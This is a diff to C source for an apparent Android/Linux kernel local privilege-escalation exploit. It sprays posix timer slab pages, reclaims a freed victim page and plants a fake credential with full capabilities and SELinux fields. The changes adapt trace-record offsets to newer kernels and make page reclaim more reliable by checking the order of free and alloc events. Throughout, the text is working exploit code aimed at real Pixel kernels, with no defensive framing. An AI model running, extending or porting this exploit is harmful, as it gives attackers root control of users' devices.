@@ -145,9 +145,16 @@ struct target_profile
     unsigned long long fullcap;
     unsigned long long selinux_blob_off;
     unsigned long long selinux_sid_kernel;
-    /* Pixel android14-6.1 frees order-1 slab pages through the PCP lists
-     * and emits no mm_page_free event; gate the spray on slabinfo then. */
+    /* 5.15/6.1 free order-1 slab pages through the PCP lists.  The
+     * mm_page_free event still fires, but those profiles also gate the
+     * spray on /proc/slabinfo to confirm the victim's timers are gone. */
     int pcp_free;
+    /* Distance from `call_site` to `bytes_req` in a raw kmem_cache_alloc
+     * trace record.  android17 (6.18) inserted a __data_loc `name` between
+     * `ptr` and `bytes_req`, so the distance is 0x18 there and 0x10 on
+     * 6.1/6.6/6.12.  `bytes_alloc` is always 8 bytes after `bytes_req`
+     * and `ptr` is always 8 bytes after `call_site`. */
+    unsigned long long alloc_req_off;
 };
 
 static struct target_profile g_cfg;
@@ -160,6 +167,10 @@ static char g_kernel[256] = "unknown";
 #define PAGE_SHIFT (g_tgt->page_shift)
 #define SLAB_ORDER (g_tgt->slab_order)
 #define SLAB_SIZE (g_tgt->slab_size)
+/* bytes_req/bytes_alloc sit this far after call_site in a raw record. */
+#define ALLOC_REQ_OFF (g_tgt->alloc_req_off)
+/* ...and this far after `ptr`, which is 8 bytes after call_site. */
+#define ALLOC_PTR_TO_REQ (g_tgt->alloc_req_off - 8)
 /* posix_timers_cache is order-1 (8K) on 4K pages, order-0 (16K) on 16K. */
 #define SLAB_MASK (~(unsigned long long)(SLAB_SIZE - 1))
 #define SLAB_OFF_MASK ((unsigned long long)(SLAB_SIZE - 1))
@@ -267,6 +278,8 @@ static void conf_defaults(void)
     g_cfg.fake_cred_off = 0x18;
     g_cfg.timer_alloc = 0x108;
     g_cfg.timer_node_off = 0x78;
+    /* 6.1/6.6/6.12 put bytes_req 0x10 after call_site; 6.18 adds `name`. */
+    g_cfg.alloc_req_off = 0x10;
     g_cfg.task_alloc_bytes = 0x12c0;
     g_cfg.fullcap = 0x1ffffffffffULL;
     g_cfg.selinux_blob_off = 0x0;
@@ -362,6 +375,7 @@ static void parse_conf_line(char *line)
     else if (!strcmp(key, "linear_min")) g_cfg.linear_min = num;
     else if (!strcmp(key, "linear_max")) g_cfg.linear_max = num;
     else if (!strcmp(key, "pcp_free")) g_cfg.pcp_free = (int)num;
+    else if (!strcmp(key, "alloc_req_off")) g_cfg.alloc_req_off = num;
 }
 
 /* A kernel release may or may not carry the "-4k" userspace suffix. */
@@ -487,6 +501,9 @@ static int selfcheck_profile(void)
     CHECK(CRED_REQ < CRED_ALLOC,
           "cred_req %#llx < cred_alloc %#llx",
           (unsigned long long)CRED_REQ, (unsigned long long)CRED_ALLOC);
+    CHECK(ALLOC_REQ_OFF == 0x10 || ALLOC_REQ_OFF == 0x18,
+          "alloc_req_off %#llx is 0x10 (pre-6.18) or 0x18 (6.18 name field)",
+          (unsigned long long)ALLOC_REQ_OFF);
     CHECK(FAKE_CRED_OFF + CRED_SIZE <= ss - TIMER_NODE_OFF,
           "fake_cred_off + cred_size (%#llx) <= slab_size - node_off (%#llx)",
           (unsigned long long)(FAKE_CRED_OFF + CRED_SIZE),
@@ -737,7 +754,7 @@ static int pair_slab_pfn(const unsigned char *b, size_t n, int pid,
     unsigned long long pend[64];
     int np = 0;
 
-    for (size_t i = 8; i + 32 <= n; i += 4)
+    for (size_t i = 8; i + 40 <= n; i += 4)
     {
         if ((int)u32(b, i - 4) != pid)
             continue;
@@ -754,7 +771,8 @@ static int pair_slab_pfn(const unsigned char *b, size_t n, int pid,
             continue;
         }
         if ((u64(b, i) & 0x1fffffULL) != TIMER_SITE_LOW21 ||
-            u64(b, i + 16) != TIMER_ALLOC || u64(b, i + 24) != TIMER_ALLOC)
+            u64(b, i + ALLOC_REQ_OFF) != TIMER_ALLOC ||
+            u64(b, i + ALLOC_REQ_OFF + 8) != TIMER_ALLOC)
             continue;
         {
             unsigned long long ptr = u64(b, i + 8);
@@ -783,7 +801,7 @@ static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
 {
     int cnt = 0;
 
-    for (size_t i = 8; i + 32 <= n; i += 4)
+    for (size_t i = 8; i + 40 <= n; i += 4)
     {
         unsigned long long site, ptr;
 
@@ -793,8 +811,9 @@ static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
         if ((site & 0x1fffffULL) != TIMER_SITE_LOW21)
             continue;
         ptr = u64(b, i + 8);
-        if (u64(b, i + 16) != TIMER_ALLOC ||
-            u64(b, i + 24) != TIMER_ALLOC || !is_kernel_ptr(ptr))
+        if (u64(b, i + ALLOC_REQ_OFF) != TIMER_ALLOC ||
+            u64(b, i + ALLOC_REQ_OFF + 8) != TIMER_ALLOC ||
+            !is_kernel_ptr(ptr))
             continue;
         if (!cnt && first_site)
             *first_site = site;
@@ -810,15 +829,15 @@ static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
 {
     int found = 0;
 
-    for (size_t i = 16; i + 24 <= n; i += 4)
+    for (size_t i = 16; i + 40 <= n; i += 4)
     {
         unsigned long long site, ptr;
 
         if (u32(b, i - 12) != (unsigned)pid)
             continue;
         ptr = u64(b, i);
-        if (!is_kernel_ptr(ptr) || u64(b, i + 8) != CRED_REQ ||
-            u64(b, i + 16) != CRED_ALLOC)
+        if (!is_kernel_ptr(ptr) || u64(b, i + ALLOC_PTR_TO_REQ) != CRED_REQ ||
+            u64(b, i + ALLOC_PTR_TO_REQ + 8) != CRED_ALLOC)
             continue;
         site = u64(b, i - 8);
         if (!is_kernel_ptr(site))
@@ -838,7 +857,7 @@ static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
 {
     int found = 0;
 
-    for (size_t i = 8; i + 32 <= n; i += 4)
+    for (size_t i = 8; i + 40 <= n; i += 4)
     {
         unsigned long long site, ptr, req, alloc;
 
@@ -848,8 +867,8 @@ static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
         if ((site & 0x1fffffULL) != COPY_PROCESS_LOW21)
             continue;
         ptr = u64(b, i + 8);
-        req = u64(b, i + 16);
-        alloc = u64(b, i + 24);
+        req = u64(b, i + ALLOC_REQ_OFF);
+        alloc = u64(b, i + ALLOC_REQ_OFF + 8);
         if (!is_kernel_ptr(ptr))
             continue;
         /* task_struct_cachep rounds 0x1440 to 0x1640 on this build. */
@@ -862,18 +881,7 @@ static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
     return found;
 }
 
-static int scan_page_free(const unsigned char *b, size_t n,
-                          unsigned long long pfn)
-{
-    for (size_t i = 16; i + 12 <= n; i += 4)
-    {
-        if (u64(b, i) != pfn || (int)u32(b, i + 8) != (int)SLAB_ORDER)
-            continue;
-        if ((u32(b, i - 8) & 0xffff) == g_t_page_free)
-            return 1;
-    }
-    return 0;
-}
+
 
 struct page_pair
 {
@@ -1679,28 +1687,43 @@ static long read_fd(int fd, unsigned char *buf, size_t cap)
     return (long)tot;
 }
 
+
 /*
- * A page_alloc for the victim pfn is only a hit if one of our spray threads
- * performed it.  A system allocation can take the freed page first; reaping
- * that node would treat the system page contents as an rb_node and panic.
+ * One pass over a trace buffer in time order: report whether the victim pfn
+ * was freed, and whether one of our spray threads allocated it *after* that
+ * free.  Accepting a page_alloc that precedes the free as a hit is unsafe --
+ * the page may still hold live timers, so reaping the zombie would run
+ * rb_erase on kernel data and panic.  Ordering the two events inside one
+ * scan makes "reclaimed" mean what run_plant needs it to mean.
  */
-static int scan_page_alloc_ours(const unsigned char *b, size_t n,
-                                unsigned long long pfn)
+static void scan_reclaim(const unsigned char *b, size_t n,
+                         unsigned long long pfn, int *free_seen, int *hit)
 {
     for (size_t i = 16; i + 12 <= n; i += 4)
     {
-        int pid;
+        unsigned type;
 
         if (u64(b, i) != pfn || (int)u32(b, i + 8) != (int)SLAB_ORDER)
             continue;
-        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
+        type = u32(b, i - 8) & 0xffff;
+        if (type == g_t_page_free)
+        {
+            *free_seen = 1;
             continue;
-        pid = (int)u32(b, i - 4);
-        for (int j = 0; j < SPRAY_THREADS; j++)
-            if (pid == atomic_load(&g_spray_tids[j]))
-                return 1;
+        }
+        if (type != g_t_page_alloc || !*free_seen)
+            continue;
+        {
+            int pid = (int)u32(b, i - 4);
+
+            for (int j = 0; j < SPRAY_THREADS; j++)
+                if (pid == atomic_load(&g_spray_tids[j]))
+                {
+                    *hit = 1;
+                    return;
+                }
+        }
     }
-    return 0;
 }
 
 static void *spray_thread(void *x)
@@ -2110,9 +2133,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
      * trace ring makes any later page_free event unambiguous, and the scan
      * below still releases phase 2 if it has not started yet.
      *
-     * Pixel android14-6.1 (pcp_free) is the exception: order-1 slab frees
-     * go through the PCP lists and emit no mm_page_free event, so gate the
-     * burst on /proc/slabinfo showing the victim's timers actually freed.
+     * 5.15/6.1 (pcp_free) additionally gate on /proc/slabinfo: the PCP
+     * free path does emit mm_page_free, but waiting for the cache's active
+     * count to drop confirms the victim's timers are actually freed.
      */
     if (g_cfg.pcp_free)
     {
@@ -2140,16 +2163,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
 
             if (m <= 0)
                 continue;
-            if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
-            {
-                hit = 1;
-            }
-            else if (!free_seen &&
-                     scan_page_free(raw, (size_t)m, slab_pfn))
-            {
-                free_seen = 1;
+            scan_reclaim(raw, (size_t)m, slab_pfn, &free_seen, &hit);
+            if (free_seen)
                 atomic_store(&g_burst2, 1);
-            }
         }
         if (!hit)
             usleep(50);
@@ -2163,8 +2179,8 @@ static void run_plant(unsigned long long target, int tag, int mode,
     {
         long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
 
-        if (m > 0 && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
-            hit = 1;
+        if (m > 0)
+            scan_reclaim(raw, (size_t)m, slab_pfn, &free_seen, &hit);
     }
     logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
          tag, free_seen, hit, now_ms() - t1);
